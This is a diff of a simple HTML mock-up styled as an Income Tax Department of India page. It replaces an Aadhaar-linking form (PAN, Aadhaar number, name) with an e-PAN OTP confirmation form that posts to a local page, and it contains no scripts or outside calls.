@@ -3,9 +3,8 @@
 
 <head>
     <title>
-        link adhaar
+        generate e-pan
     </title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
             font-family: Arial, Helvetica, sans-serif;
@@ -16,8 +15,8 @@
         
         form {
             border: 3px solid #f1f1f1;
-            width: 500px;
-            height: 500px;
+            width: 600px;
+            height: 300px;
             text-align: left;
             margin: 0 auto;
         }
@@ -53,16 +52,6 @@
             background-color: #f44336;
         }
         
-        .imgcontainer {
-            text-align: center;
-            margin: 24px 0 12px 0;
-        }
-        
-        img.avatar {
-            width: 40%;
-            border-radius: 50%;
-        }
-        
         .container {
             padding: 16px;
         }
@@ -87,25 +76,15 @@
 
 <body>
     <h1 style="text-align: center; color:rgb(255, 255, 255) ;">INCOME TAX DEPARTMENT OF INDIA</h1>
-    <h2 style="text-align:center;">Link adhaar form</h2>
+    <h3 style="text-align:center;">Generate e-pan</h3>
+    <form action="confirm.html" method="post">
 
-    <form action="/action_page.php" method="post">
-        <div class="imgcontainer">
-            <img src="adhaar.jpg" alt="Adhaar" class="avatar">
-        </div>
 
         <div class="container">
-            <label for="number"><b>PAN Number</b></label>
-            <input type="number" placeholder="Enter PAN Number" name="number" required>
-            <br>
+            <label for="number"><b>Enter otp</b></label>
+            <input type="number" placeholder="one time password" name="number" required><br>
 
-            <label for="number"><b>Adhaar number</b></label>
-            <input type="number" placeholder="Enter Adhaar number" name="number" required><br>
-
-            <label for="number"><b>Adhaar name</b></label>
-            <input type="text" placeholder="Enter Adhaar name as per adhaar card" name="number" required><br>
-
-            <button type="submit">Link Adhaar</button>
+            <button type="submit">confirm</button>
 
         </div>
 
@@ -114,7 +93,6 @@
 
         </div>
     </form>
-
 </body>
 
 </html>
